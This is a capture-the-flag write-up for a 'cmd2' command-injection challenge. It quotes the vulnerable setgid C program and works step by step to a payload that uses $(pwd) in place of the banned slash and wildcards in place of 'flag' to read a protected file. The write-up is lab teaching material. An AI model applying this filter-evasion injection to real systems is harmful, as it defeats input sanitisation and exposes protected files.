First I needed to get the cmd1 flag again so I did that quickly and got started
```bash
cmd1@ubuntu:~$ ./cmd1 "/bin/cat f*"
[flag🤫]
```

I opened the c file `cmd2.c`
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        setregid(getegid(), getegid());
        system( argv[1] );
        return 0;
}
```

reading the c code in the server I saw that I needed to access the flag after the PATH variable was discarded...
```c
putenv("PATH=/no_command_execution_until_you_become_a_hacker");
```

I also could not use any of these in my commands: =, PATH, export, /, \`, flag
so my problem was to get to the commands.
My first thought was to create an alias for the command that I wanted.
```bash
cmd2@ubuntu:~$ alias docs='/bin/cat flag'
cmd2@ubuntu:~$ ./cmd2 docs
docs
sh: 1: docs: not found
```
But the alias had a scope of the current terminal session and was not recognized by the system.
I tried creating a global alias but I did not have permission...

I decided to take a look at what commands I had that were built in to the shell and saw that I had `cd` so I tried to build a payload that will bring me to where the bin folder is located so there I could try and run a real command.

First I wanted to see where the script was running so that I could know how to get to the bin folder.
```bash
cmd2@ubuntu:~$ ./cmd2 "pwd"
pwd
/home/cmd2
```

Now that I knew that the shell was running in the `cmd2` directory I could build my command.
I still had a problem because when I was in the bin directory I did not have the flag file.
After a lot of trialing and researching i realized that it was not the right direction so I 
started to think about  how I can make a `/` without explicitly typing it in.

I tried by echoing its ascii value `\x2f` which worked well in bash but did not work in shell
```bash
cmd2@ubuntu:~$ echo $(echo -e \\x2f)
/
cmd2@ubuntu:~$ ./cmd2 "\$(echo -e \\\\x2f)bin\$(echo -e \\\\x2f)cat f\lag"
$(echo -e \\x2f)bin$(echo -e \\x2f)cat f\lag
sh: 1: -e: not found
```

So I decided to take a step back and remember what tools I had.
I had the `pwd` since it is built in to the shell. so I wanted to use it to fake slashes by being in the root directory. 
```bash
cmd2@ubuntu:/$ pwd
/
```

Now all I had to do was integrate it into my payload and run the command
```bash
cmd2@ubuntu:/$ $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)flag
/bin/cat: /home/cmd2/flag: Permission denied
cmd2@ubuntu:~$ ./cmd2 'cd .. && cd .. && $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*'
cd .. && cd .. && $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*
[flag🤫]
```